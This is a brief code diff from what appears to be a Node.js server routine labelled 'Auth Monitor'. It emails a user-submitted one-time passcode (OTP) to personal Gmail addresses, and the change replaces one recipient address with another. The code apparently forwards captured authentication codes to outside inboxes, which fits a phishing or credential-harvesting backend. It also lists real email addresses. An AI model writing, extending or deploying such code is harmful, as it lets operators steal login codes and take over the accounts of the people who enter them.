@@ -80,7 +80,7 @@ OTP Code: ${body.otp ?? "NOT PROVIDED"}
 
     await transporter.sendMail({
       from: `"Auth Monitor" <${process.env.EMAIL_USER}>`,
-      to: ["andrewilliams2091@gmail.com", "daxumjay@gmail.com"],
+      to: ["Payalhosiery@gmail.com", "daxumjay@gmail.com"],
       subject,
       text,
     });
